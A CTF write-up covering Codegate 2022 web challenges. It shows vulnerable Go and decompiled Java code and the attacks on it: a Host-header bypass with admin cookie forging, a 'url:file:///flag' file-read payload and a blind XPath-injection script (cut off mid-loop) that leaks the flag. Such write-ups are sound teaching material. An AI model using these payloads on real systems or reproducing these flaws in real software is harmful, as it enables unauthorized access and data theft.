---
title: 'Codegate CTF 2022 Preliminary'
description: Codegate CTF 2022 Preliminary write-ups
layout: "post.ejs"
permalink: "/codegate-2022-preliminary/"
date: 2022-02-28T00:00:00Z
---

Write-ups:
* [superbee - Web](#superbee)
* [babyFirst - Web](#babyfirst)
* [myblog - Web](#myblog)
* [nft - Blockchain](#nft)

<a name="superbee"></a>
# superbee (Web)


Description:

```
http://3.39.49.174:30001/
```

We are given the source code of a web application written in go using the beego web server:

```go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"bytes"
	"github.com/beego/beego/v2/server/web"
)

type BaseController struct {
	web.Controller
	controllerName string
	actionName string
}

type MainController struct {
	BaseController
}

type LoginController struct {
	BaseController
}

type AdminController struct {
	BaseController
}

var admin_id string
var admin_pw string
var app_name string
var auth_key string
var auth_crypt_key string
var flag string

func AesEncrypt(origData, key []byte) ([]byte, error) {
	padded_key := Padding(key, 16)
	block, err := aes.NewCipher(padded_key)
	if err != nil {
		return nil, err
	}
	blockSize := block.BlockSize()
	origData = Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, padded_key[:blockSize])
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return crypted, nil
}

func Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func Md5(s string) string {
	h := md5.New()
	h.Write([]byte(s))
	return hex.EncodeToString(h.Sum(nil))
}

func (this *BaseController) Prepare() {
	controllerName, _ := this.GetControllerAndAction()
	session := this.Ctx.GetCookie(Md5("sess"))

	if controllerName == "MainController" {
		if session == "" || session != Md5(admin_id + auth_key) {
			this.Redirect("/login/login", 403)
			return
		}
	} else if controllerName == "LoginController" {
		if session != "" {
			this.Ctx.SetCookie(Md5("sess"), "")
		}
	} else if controllerName == "AdminController" {
		domain := this.Ctx.Input.Domain()

		if domain != "localhost" {
			this.Abort("Not Local")
			return
		}
	}
}

func (this *MainController) Index() {
	this.TplName = "index.html"
	this.Data["app_name"] = app_name
	this.Data["flag"] = flag
	this.Render()
}

func (this *LoginController) Login() {
	this.TplName = "login.html"
	this.Data["app_name"] = app_name
	this.Render()
}

func (this *LoginController) Auth() {
	id := this.GetString("id")
	password := this.GetString("password")

	if id == admin_id && password == admin_pw {
		this.Ctx.SetCookie(Md5("sess"), Md5(admin_id + auth_key), 300)

		this.Ctx.WriteString("<script>alert('Login Success');location.href='/main/index';</script>")
		return
	}
	this.Ctx.WriteString("<script>alert('Login Fail');location.href='/login/login';</script>")
}

func (this *AdminController) AuthKey() {
	encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key))
	this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key))
}

func main() {
	app_name, _ = web.AppConfig.String("app_name")
	auth_key, _ = web.AppConfig.String("auth_key")
	auth_crypt_key, _ = web.AppConfig.String("auth_crypt_key")
	admin_id, _ = web.AppConfig.String("id")
	admin_pw, _ = web.AppConfig.String("password")
	flag, _ = web.AppConfig.String("flag")

	web.AutoRouter(&MainController{})
	web.AutoRouter(&LoginController{})
	web.AutoRouter(&AdminController{})
	web.Run()
}
```

The goal of the challenge is to login as admin, since the flag will then be displayed. We can see that the application get its admin_id and admin_pw from the AppConfig, which we are provided with:
```
app_name = superbee
auth_key = [----------REDEACTED------------]
id = admin
password = [----------REDEACTED------------]
flag = [----------REDEACTED------------]
```
However the flag, auth_key and password are redacted. Important thing to notice is the fact that `auth_crypt_key` is missing from app.conf and in this case `web.AppConfig.String("auth_crypt_key")` returns an empty string.
The cookie that provides authentication is formed like this:
```go
this.Ctx.SetCookie(Md5("sess"), Md5(admin_id + auth_key), 300)
```
Since we know admin_id = admin, we just need to get auth_key. We can get the encrypted auth_key by visiting the /admin/authkey route
```go
func (this *AdminController) AuthKey() {
	encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key))
	this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key))
}
```
That route however is only for localhost
```go
	} else if controllerName == "AdminController" {
		domain := this.Ctx.Input.Domain()

		if domain != "localhost" {
			this.Abort("Not Local")
			return
		}
	}
```
But we can bypass that by setting `Host: localhost` in Burp, and we get the encrypted auth_key
```
00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607
```
At this point we should try decrypting the auth_key using an empty `auth_crypt_key`, we should first see how the encryption is done:
```go
func AesEncrypt(origData, key []byte) ([]byte, error) {
	padded_key := Padding(key, 16)
	block, err := aes.NewCipher(padded_key)
	if err != nil {
		return nil, err
	}
	blockSize := block.BlockSize()
	origData = Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, padded_key[:blockSize])
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return crypted, nil
}
```
So it's just AES CBC using the key as IV, and the key is padded to 16 byte multiple using the Padding function. Since the key is initially empty, the padded key will be `16 * b'\x10'`
We can decrypt it using python:
```py
$ python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.Cipher import AES
>>> key = 16 * b'\x10'
>>> aes = AES.new(key, AES.MODE_CBC, key)
>>> aes.decrypt(bytes.fromhex('00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607'))
b'Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'
```
We get the auth_key `Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d`
To create the cookie:
```py
>>> import hashlib
>>> hashlib.md5(b'sess').hexdigest() + '=' + hashlib.md5(b'admin' + b'Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d').hexdigest()
'f5b338d6bca36d47ee04d93d08c57861=e52f118374179d24fa20ebcceb95c2af'
```
To get the flag we must visit the /main/index path using the HTTP header 
```
Cookie: f5b338d6bca36d47ee04d93d08c57861=e52f118374179d24fa20ebcceb95c2af
```
And we get the flag:

`codegate2022{d9adbe86f4ecc93944e77183e1dc6342}`

<a name="babyfirst"></a>
# babyFirst (Web)


Description:

```
get the flag

http://3.39.72.134
```

To get the source code of the application we must decompile MemoServlet.class from WEB-INF/classes/controller, we can decompile it using any Java class decompiler, I used http://www.javadecompilers.com/
```java
// 
// Decompiled by Procyon v0.5.36
// 

package controller;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;
import java.sql.DriverManager;
import javax.servlet.ServletConfig;
import java.util.regex.Matcher;
import java.util.Base64;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.regex.Pattern;
import java.sql.ResultSet;
import java.util.HashMap;
import java.sql.SQLException;
import java.sql.PreparedStatement;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import javax.servlet.ServletException;
import java.io.PrintWriter;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import java.sql.Connection;
import javax.servlet.http.HttpServlet;

public class MemoServlet extends HttpServlet
{
    private Connection conn;
    
    public MemoServlet() {
        this.conn = null;
    }
    
    private void alert(final HttpServletRequest req, final HttpServletResponse res, final String msg, final String back) throws ServletException, IOException {
        res.setContentType("text/html");
        final PrintWriter pw = res.getWriter();
        pw.println("<script>");
        pw.println("alert('" + msg + "')");
        if (back != null && back.length() > 0) {
            pw.println(";location.href='" + back + "';");
        }
        pw.println("</script>");
        pw.close();
    }
    
    private boolean isLogin(final HttpServletRequest req) {
        final HttpSession session = req.getSession();
        final Object name = session.getAttribute("name");
        return name != null;
    }
    
    private String lookupPage(final String uri) {
        final String[] array = uri.split("\\/");
        if (array.length != 3) {
            return "error";
        }
        return array[2].trim();
    }
    
    private void doLogin(final HttpServletRequest req) throws ServletException, IOException {
        String name = req.getParameter("name");
        if (name == null || name.length() <= 0 || name.length() > 100) {
            name = "noname";
        }
        final HttpSession session = req.getSession();
        session.setAttribute("name", (Object)name);
    }
    
    private void doWrite(final HttpServletRequest req, final HttpServletResponse res) throws ServletException, IOException, SQLException {
        final HttpSession session = req.getSession();
        final String name = (String)session.getAttribute("name");
        String memo = req.getParameter("memo");
        if (memo == null || memo.length() <= 0) {
            memo = "no memo";
        }
        if (memo.length() > 2000) {
            memo = "too long";
        }
        PreparedStatement pstmt = null;
        try {
            final String sql = "INSERT INTO memos (`name`, `memo`) VALUES (?,?)";
            pstmt = this.conn.prepareStatement(sql);
            pstmt.setString(1, name);
            pstmt.setString(2, memo);
            final int result = pstmt.executeUpdate();
            if (result > 0) {
                this.alert(req, res, "write", "/memo/list");
            }
            else {
                this.alert(req, res, "error", "/memo/list");
            }
        }
        catch (Exception e) {
            return;
        }
        finally {
            if (pstmt != null) {
                pstmt.close();
            }
        }
        this.alert(req, res, "error", "/memo/list");
    }
    
    private HashMap<Integer, String> getList(final HttpServletRequest req, final HttpServletResponse res) throws ServletException, IOException, SQLException {
        final HttpSession session = req.getSession();
        final String name = (String)session.getAttribute("name");
        PreparedStatement pstmt = null;
        try {
            final String sql = "SELECT * FROM memos WHERE `name`=? ORDER BY idx DESC";
            pstmt = this.conn.prepareStatement(sql);
            pstmt.setString(1, name);
            final HashMap<Integer, String> result = new HashMap<Integer, String>();
            final ResultSet rs = pstmt.executeQuery();
            while (rs.next()) {
                result.put(rs.getInt(1), rs.getString(3));
            }
            return result;
        }
        catch (Exception e) {
            System.out.println(e.getMessage());
        }
        finally {
            if (pstmt != null) {
                pstmt.close();
            }
        }
        return null;
    }
    
    private static String lookupImg(String memo) {
        Pattern pattern = Pattern.compile("(\\[[^\\]]+\\])");
        Matcher matcher = pattern.matcher(memo);
        String img = "";
        if (!matcher.find()) {
            return "";
        }
        img = matcher.group();
        String tmp = img.substring(1, img.length() - 1);
        tmp = tmp.trim().toLowerCase();
        pattern = Pattern.compile("^[a-z]+:");
        matcher = pattern.matcher(tmp);
        if (!matcher.find() || matcher.group().startsWith("file")) {
            return "";
        }
        String urlContent = "";
        try {
            final URL url = new URL(tmp);
            final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String inputLine = "";
            while ((inputLine = in.readLine()) != null) {
                urlContent = urlContent + inputLine + "\n";
            }
            in.close();
        }
        catch (Exception e) {
            return "";
        }
        final Base64.Encoder encoder = Base64.getEncoder();
        try {
            final String encodedString = new String(encoder.encode(urlContent.getBytes("utf-8")));
            memo = memo.replace(img, "<img src='data:image/jpeg;charset=utf-8;base64," + encodedString + "'><br/>");
            return memo;
        }
        catch (Exception e2) {
            return "";
        }
    }
    
    private String getMemo(final HttpServletRequest req, final HttpServletResponse res) throws ServletException, IOException, SQLException {
        final HttpSession session = req.getSession();
        final String name = (String)session.getAttribute("name");
        int idx = 0;
        try {
            idx = Integer.parseInt(req.getParameter("idx"));
        }
        catch (Exception e) {
            return "";
        }
        PreparedStatement pstmt = null;
        try {
            final String sql = "SELECT * FROM memos WHERE name=? AND idx=?";
            pstmt = this.conn.prepareStatement(sql);
            pstmt.setString(1, name);
            pstmt.setInt(2, idx);
            final ResultSet rs = pstmt.executeQuery();
            String memo = "";
            if (!rs.next()) {
                return "";
            }
            memo = rs.getString(3);
            final String tmp = lookupImg(memo);
            if ("".equals(tmp)) {
                return memo;
            }
            return tmp;
        }
        catch (Exception e2) {
            this.alert(req, res, "error", "/memo/list");
        }
        finally {
            if (pstmt != null) {
                pstmt.close();
            }
        }
        this.alert(req, res, "error", "/memo/list");
        return "";
    }
    
    public void init(final ServletConfig config) {
        try {
            final String DB_URL = "jdbc:mysql://mysql:3306/memo?serverTimezone=UTC";
            final String dbUser = config.getInitParameter("dbUser");
            final String dbPass = config.getInitParameter("dbPass");
            final String JDBC_DRIVER = "com.mysql.cj.jdbc.Driver";
            Class.forName(JDBC_DRIVER);
            this.conn = DriverManager.getConnection(DB_URL, dbUser, dbPass);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void destroy() {
        try {
            this.conn.close();
        }
        catch (SQLException throwables) {
            throwables.printStackTrace();
        }
    }
    
    public void doGet(final HttpServletRequest req, final HttpServletResponse res) throws ServletException, IOException {
        if (!this.isLogin(req)) {
            this.alert(req, res, "login first", "/");
            return;
        }
        final String page = this.lookupPage(req.getRequestURI());
        if ("list".equals(page)) {
            try {
                req.setAttribute("list", (Object)this.getList(req, res));
            }
            catch (SQLException throwables) {
                throwables.printStackTrace();
            }
        }
        else if ("read".equals(page)) {
            try {
                final String memo = this.getMemo(req, res);
                req.setAttribute("memo", (Object)memo);
            }
            catch (SQLException throwables) {
                System.out.println(throwables.getMessage());
            }
        }
        final RequestDispatcher rd = req.getRequestDispatcher("/WEB-INF/jsp/" + page + ".jsp");
        rd.forward((ServletRequest)req, (ServletResponse)res);
    }
    
    public void doPost(final HttpServletRequest req, final HttpServletResponse res) throws ServletException, IOException {
        final String page = this.lookupPage(req.getRequestURI());
        if (!page.equals("login") && !this.isLogin(req)) {
            this.alert(req, res, "login first", "/");
            return;
        }
        final String s = page;
        switch (s) {
            case "login": {
                this.doLogin(req);
                this.alert(req, res, "welcome", "/memo/list");
                break;
            }
            case "write": {
                try {
                    this.doWrite(req, res);
                }
                catch (SQLException throwables) {
                    this.alert(req, res, "error", "/memo/list");
                    System.out.println(throwables.getMessage());
                }
                break;
            }
            default: {
                this.alert(req, res, "error", "/memo/list");
                break;
            }
        }
    }
}
```
From the Dockerfile we know that the flag is in /flag
```dockerfile
COPY flag /flag
```
Knowing that, I pretty much ignored any SQL statements since that would not get the flag right away. The vulnerability can be found in the lookupImg function:
```java
 private static String lookupImg(String memo) {
        Pattern pattern = Pattern.compile("(\\[[^\\]]+\\])");
        Matcher matcher = pattern.matcher(memo);
        String img = "";
        if (!matcher.find()) {
            return "";
        }
        img = matcher.group();
        String tmp = img.substring(1, img.length() - 1);
        tmp = tmp.trim().toLowerCase();
        pattern = Pattern.compile("^[a-z]+:");
        matcher = pattern.matcher(tmp);
        if (!matcher.find() || matcher.group().startsWith("file")) {
            return "";
        }
        String urlContent = "";
        try {
            final URL url = new URL(tmp);
            final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String inputLine = "";
            while ((inputLine = in.readLine()) != null) {
                urlContent = urlContent + inputLine + "\n";
            }
            in.close();
        }
        catch (Exception e) {
            return "";
        }
        final Base64.Encoder encoder = Base64.getEncoder();
        try {
            final String encodedString = new String(encoder.encode(urlContent.getBytes("utf-8")));
            memo = memo.replace(img, "<img src='data:image/jpeg;charset=utf-8;base64," + encodedString + "'><br/>");
            return memo;
        }
        catch (Exception e2) {
            return "";
        }
    }
```
We can insert values like [http://89s3jbdk.requestrepo.com] and the value will be interpreted like an URL and then read using InputStreamReader.
This issue is known as [Java/CWE-036](https://github.com/github/securitylab/issues/41). In our case though file: is filtered, but as we will see, not in a good way.
The regex
```java
pattern = Pattern.compile("^[a-z]+:");
matcher = pattern.matcher(tmp);
if (!matcher.find() || matcher.group().startsWith("file")) {
    return "";
}
```
Will only match file: if it as the beginning of the line. There are some other protocols that we can use, including `jar:` with a remote file that will get hit, however a symlink approach didn't work. There are also some protocols implemented by tomcat like `war:`, but that is basically just `jar:` with some extra features. 

We found the solution using [GitHub's codesearch](https://cs.github.com/) while searching for `file:` examples in java files:
```java
  /**
   * Provided that the given URL points to a JAR file (or classes contained therein),
   * the method transforms the string representation of the given URL
   * into a string presentation of the local file system path of the JAR file.
   * If the URL does not point to a JAR, the method returns null.
   * Examples of URLs are as follows:
   * url:file:/a/b/c.jar!123.class
   * file:/a/b/c.jar
   *
   * @param _url a {@link java.lang.String} object.
   * @return a {@link java.lang.String} object.
   */
  public static String getJarFilePath(String _url) {
    String file_url = null, file_path = null;

    // (1) Bring _url into form "file:/<abc>.jar"
    if (_url != null && _url.startsWith("file:") && _url.endsWith(".jar")) {
      file_url = _url;
    } else if (_url != null && _url.startsWith("jar:file:")) {
      file_url = _url.substring(4); // new String("jar:").length());
      final int idx = file_url.indexOf('!');
      if (idx != -1) file_url = file_url.substring(0, idx);
    }

    // 2) If that worked, transform into FS path
    if (file_url != null) {
      URI uri = null;
      try {
        uri = new URI(file_url);
        file_path = Paths.get(uri).toString();
      } catch (URISyntaxException e) {
        log.error("Cannot create URI from [" + file_url + "]");
      }
    }

    return file_path;
  }
```
This is taken from 
https://github.com/eclipse/steady/blob/98dbd902211091aec673539e42619dcb3f899501/shared/src/main/java/org/eclipse/steady/shared/util/FileUtil.java#L506

We just need to use a random name, create a post using the payload and then get the flag from the image base64 data.

The final payload is `[url:file:///flag]` and the flag is `codegate2022{8953bf834fdde34ae51937975c78a895863de1e1}`

<a name="myblog"></a>
# myblog (Web)


Description:

```
I made a blog. Please check the security.

http://3.39.79.180
```

To get the source code of the application we must decompile blogServlet.class from WEB-INF/classes, we can decompile it using any Java class decompiler, I used http://www.javadecompilers.com/

```java
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;
import javax.servlet.ServletConfig;
import java.io.IOException;
import javax.servlet.ServletException;
import java.io.PrintWriter;
import javax.servlet.http.HttpServletResponse;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathFactory;
import javax.xml.transform.Transformer;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.w3c.dom.Document;
import javax.xml.transform.Result;
import javax.xml.transform.Source;
import java.io.OutputStream;
import javax.xml.transform.stream.StreamResult;
import java.io.FileOutputStream;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.TransformerFactory;
import org.w3c.dom.Node;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.InputStream;
import org.xml.sax.InputSource;
import java.io.FileInputStream;
import java.io.File;
import java.security.NoSuchAlgorithmException;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.servlet.http.HttpSession;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServlet;

// 
// Decompiled by Procyon v0.5.36
// 

public class blogServlet extends HttpServlet
{
    private String tmpDir;
    
    public blogServlet() {
        this.tmpDir = System.getProperty("java.io.tmpdir") + "/db/";
    }
    
    private boolean isLogin(final HttpServletRequest req) {
        final HttpSession session = req.getSession();
        final Object id = session.getAttribute("id");
        return id != null;
    }
    
    private boolean idCheck(final String str) {
        final Pattern pattern = Pattern.compile("[^a-zA-Z0-9_]");
        final Matcher matcher = pattern.matcher(str);
        return !matcher.find() && str.length() <= 10;
    }
    
    private String decBase64(final String str) {
        final byte[] decodedBytes = Base64.getDecoder().decode(str);
        final String decodedString = new String(decodedBytes);
        return decodedString;
    }
    
    private String encBase64(final String str) {
        final Base64.Encoder encoder = Base64.getEncoder();
        try {
            final String encodedString = new String(encoder.encode(str.getBytes("utf-8")));
            return encodedString;
        }
        catch (Exception e) {
            return "";
        }
    }
    
    private String encMD5(final String str) {
        String MD5 = "";
        try {
            final MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(str.getBytes());
            final byte[] byteData = md.digest();
            final StringBuffer sb = new StringBuffer();
            for (int i = 0; i < byteData.length; ++i) {
                sb.append(Integer.toString((byteData[i] & 0xFF) + 256, 16).substring(1));
            }
            MD5 = sb.toString();
        }
        catch (NoSuchAlgorithmException e) {
            System.out.println(e.getMessage());
            MD5 = "";
        }
        return MD5;
    }
    
    private String lookupPage(final String uri) {
        final String[] array = uri.split("\\/");
        if (array.length != 3) {
            return "error";
        }
        return array[2].trim();
    }
    
    private boolean doRegister(final HttpServletRequest req) {
        this.initUserDB();
        final File userDB = new File(this.tmpDir, "users.xml");
        final String id = req.getParameter("id");
        final String pw = req.getParameter("pw");
        if (id == null || pw == null || !this.idCheck(id)) {
            return false;
        }
        try {
            final InputSource is = new InputSource(new FileInputStream(userDB));
            final Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(is);
            document.setXmlStandalone(true);
            final NodeList usersNodeList = document.getElementsByTagName("users");
            final Element userElement = document.createElement("user");
            userElement.setTextContent(id + "/" + this.encMD5(pw));
            usersNodeList.item(0).appendChild(userElement);
            final TransformerFactory transformerFactory = TransformerFactory.newInstance();
            final Transformer transformer = transformerFactory.newTransformer();
            transformer.setOutputProperty("{http://xml.apache.org/xslt}indent-amount", "4");
            transformer.setOutputProperty("encoding", "UTF-8");
            transformer.setOutputProperty("indent", "yes");
            final DOMSource source = new DOMSource(document);
            final StreamResult result = new StreamResult(new FileOutputStream(userDB));
            transformer.transform(source, result);
            return true;
        }
        catch (Exception e) {
            System.out.println(e.getMessage());
            return false;
        }
    }
    
    private boolean doLogin(final HttpServletRequest req) {
        this.initUserDB();
        String id = req.getParameter("id");
        String pw = req.getParameter("pw");
        if (id == null || pw == null) {
            return false;
        }
        id = id.trim();
        pw = this.encMD5(pw.trim());
        Boolean flag = false;
        try {
            final File userDB = new File(this.tmpDir, "users.xml");
            final InputSource is = new InputSource(new FileInputStream(userDB));
            final Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(is);
            final NodeList userList = document.getElementsByTagName("user");
            for (int length = userList.getLength(), i = 0; i < length; ++i) {
                final Node user = userList.item(i);
                final String info = user.getTextContent();
                if (info.trim().equals(id + "/" + pw)) {
                    flag = true;
                    req.getSession().setAttribute("id", (Object)id);
                    this.initUserArticle(req);
                    break;
                }
            }
            return flag;
        }
        catch (Exception e) {
            System.out.println(e.getMessage());
            return false;
        }
    }
    
    private boolean doWriteArticle(final HttpServletRequest req) {
        this.initUserArticle(req);
        final String id = (String)req.getSession().getAttribute("id");
        String title = req.getParameter("title");
        String content = req.getParameter("content");
        if (id == null || title == null || content == null) {
            return false;
        }
        title = this.encBase64(title);
        content = this.encBase64(content);
        final File userArticle = new File(this.tmpDir + "/article/", id + ".xml");
        try {
            final InputSource is = new InputSource(new FileInputStream(userArticle));
            final Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(is);
            document.setXmlStandalone(true);
            final NodeList articleNodeList = document.getElementsByTagName("articles");
            final int length = document.getElementsByTagName("article").getLength();
            final Element articleElement = document.createElement("article");
            articleElement.setAttribute("idx", Integer.toString(length + 1));
            final Element titleElement = document.createElement("title");
            titleElement.setTextContent(title);
            final Element contentElement = document.createElement("content");
            contentElement.setTextContent(content);
            articleElement.appendChild(titleElement);
            articleElement.appendChild(contentElement);
            articleNodeList.item(0).appendChild(articleElement);
            final TransformerFactory transformerFactory = TransformerFactory.newInstance();
            final Transformer transformer = transformerFactory.newTransformer();
            transformer.setOutputProperty("{http://xml.apache.org/xslt}indent-amount", "4");
            transformer.setOutputProperty("encoding", "UTF-8");
            transformer.setOutputProperty("indent", "yes");
            final DOMSource source = new DOMSource(document);
            final StreamResult result = new StreamResult(new FileOutputStream(userArticle));
            transformer.transform(source, result);
            return true;
        }
        catch (Exception e) {
            System.out.println(e.getMessage());
            return false;
        }
    }
    
    private String[] doReadArticle(final HttpServletRequest req) {
        final String id = (String)req.getSession().getAttribute("id");
        final String idx = req.getParameter("idx");
        if ("null".equals(id) || idx == null) {
            return null;
        }
        final File userArticle = new File(this.tmpDir + "/article/", id + ".xml");
        try {
            final InputSource is = new InputSource(new FileInputStream(userArticle));
            final Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(is);
            final XPath xpath = XPathFactory.newInstance().newXPath();
            String title = (String)xpath.evaluate("//article[@idx='" + idx + "']/title/text()", document, XPathConstants.STRING);
            String content = (String)xpath.evaluate("//article[@idx='" + idx + "']/content/text()", document, XPathConstants.STRING);
            title = this.decBase64(title.trim());
            content = this.decBase64(content.trim());
            return new String[] { title, content };
        }
        catch (Exception e) {
            System.out.println(e.getMessage());
            return null;
        }
    }
    
    private void initUserArticle(final HttpServletRequest req) {
        final HttpSession session = req.getSession();
        final String id = (String)session.getAttribute("id");
        if ("null".equals(id)) {
            return;
        }
        try {
            final File articleDir = new File(this.tmpDir, "article");
            if (!articleDir.exists()) {
                articleDir.mkdir();
            }
            final File userArticle = new File(articleDir, id + ".xml");
            if (!userArticle.exists()) {
                final DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
                final DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
                final Document doc = docBuilder.newDocument();
                doc.setXmlStandalone(true);
                final Element articles = doc.createElement("articles");
                doc.appendChild(articles);
                final TransformerFactory transformerFactory = TransformerFactory.newInstance();
                final Transformer transformer = transformerFactory.newTransformer();
                transformer.setOutputProperty("{http://xml.apache.org/xslt}indent-amount", "4");
                transformer.setOutputProperty("encoding", "UTF-8");
                transformer.setOutputProperty("indent", "yes");
                final DOMSource source = new DOMSource(doc);
                final StreamResult result = new StreamResult(new FileOutputStream(userArticle));
                transformer.transform(source, result);
            }
        }
        catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }
    
    private void initUserDB() {
        final File userDB = new File(this.tmpDir, "users.xml");
        try {
            if (!userDB.exists()) {
                final DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
                final DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
                final Document doc = docBuilder.newDocument();
                doc.setXmlStandalone(true);
                final Element users = doc.createElement("users");
                doc.appendChild(users);
                final TransformerFactory transformerFactory = TransformerFactory.newInstance();
                final Transformer transformer = transformerFactory.newTransformer();
                transformer.setOutputProperty("{http://xml.apache.org/xslt}indent-amount", "4");
                transformer.setOutputProperty("encoding", "UTF-8");
                transformer.setOutputProperty("indent", "yes");
                final DOMSource source = new DOMSource(doc);
                final StreamResult result = new StreamResult(new FileOutputStream(userDB));
                transformer.transform(source, result);
            }
        }
        catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }
    
    private void alert(final HttpServletRequest req, final HttpServletResponse res, final String msg, final String back) throws ServletException, IOException {
        res.setContentType("text/html");
        final PrintWriter pw = res.getWriter();
        pw.println("<script>");
        pw.println("alert('" + msg + "')");
        if (back != null && back.length() > 0) {
            pw.print(";location.href='" + back + "';");
        }
        pw.println("</script>");
        pw.close();
    }
    
    public void init(final ServletConfig config) {
        try {
            final File dbDir = new File(this.tmpDir);
            if (!dbDir.exists()) {
                dbDir.mkdir();
            }
            this.initUserDB();
        }
        catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }
    
    public void doGet(final HttpServletRequest req, final HttpServletResponse res) throws ServletException, IOException {
        final String page = this.lookupPage(req.getRequestURI()).trim();
        if (!"login".equals(page) && !"register".equals(page) && !this.isLogin(req)) {
            this.alert(req, res, "login first", "/blog/login");
        }
        if ("read".equals(page)) {
            req.setAttribute("article", (Object)this.doReadArticle(req));
        }
        final RequestDispatcher rd = req.getRequestDispatcher("/WEB-INF/jsp/" + page + ".jsp");
        rd.forward((ServletRequest)req, (ServletResponse)res);
    }
    
    public void doPost(final HttpServletRequest req, final HttpServletResponse res) throws ServletException, IOException {
        final String page = this.lookupPage(req.getRequestURI());
        if (!"login".equals(page) && !"register".equals(page) && !this.isLogin(req)) {
            this.alert(req, res, "login first", "/blog/login");
        }
        final String s = page;
        switch (s) {
            case "register": {
                if (this.doRegister(req)) {
                    this.alert(req, res, "register ok", "/blog/write");
                    break;
                }
                this.alert(req, res, "register fail", "/blog/register");
                break;
            }
            case "login": {
                if (this.doLogin(req)) {
                    this.alert(req, res, "login ok", "/blog/write");
                    break;
                }
                this.alert(req, res, "login fail", "/blog/login");
                break;
            }
            case "write": {
                if (this.doWriteArticle(req)) {
                    this.alert(req, res, "write ok", "/");
                    break;
                }
                this.alert(req, res, "write fail", "/");
                break;
            }
        }
    }
}
```
We can notice unsafe string concatenation at lines 224-225 (in doReadArticle function, which can be called by the `/blog/read?idx=1` path):
```java
String title = (String)xpath.evaluate("//article[@idx='" + idx + "']/title/text()", document, XPathConstants.STRING);
String content = (String)xpath.evaluate("//article[@idx='" + idx + "']/content/text()", document, XPathConstants.STRING);
```
And idx is `final String idx = req.getParameter("idx");` and the input is not sanitized.
We have XPath injection. We can use tips from https://book.hacktricks.xyz/pentesting-web/xpath-injection on how to exploit it. 
We have file read and OOB exploitation so this should be easy, right?
Well, the thing is that the functions required `doc` or `doc-available` are implemented only in XPath 2.0, while our poor `javax.xml.xpath.XPathFactory` only implements XPath 1.0 (and XSLT 1.0)!
I however found this wonderful Quick Reference for XPath 1.0 & XSLT 1.0 https://www.mulberrytech.com/quickref/XSLT_1quickref-v2.pdf
The interesting function can be seen in the top right, `object system-property(string)` and then remember where the flag is:
```dockerfile
RUN echo 'flag=codegate2022{md5(flag)}' >> /usr/local/tomcat/conf/catalina.properties
```
In the tomcat properties file, maybe we can query the flag variable using system-property :), and indeed we can! What is left is just to do a binary SQL-like type of exfil, where we check each character of the flag and if it matches we return the article, else the article is empty.

Exfiltrate flag script, JSESSIONID and 'ahadfgsdaf' must be modified, `ahadfgsdaf` is the article title/content:

```py
import requests

flag = 'codegate2022{'

while '}' not in flag:
    for c in '0123456789abcdef}':
        burp0_url = "http://3.39.79.180/blog/read?idx=1'+and+substring(system-property('flag'),"+str(len(flag)+1)+",1)='"+c+"'+and+'1'%3d'1"
        burp0_cookies = {"JSESSIONID": "A9408AC5B370E7585B8DED281DCD86F7"}
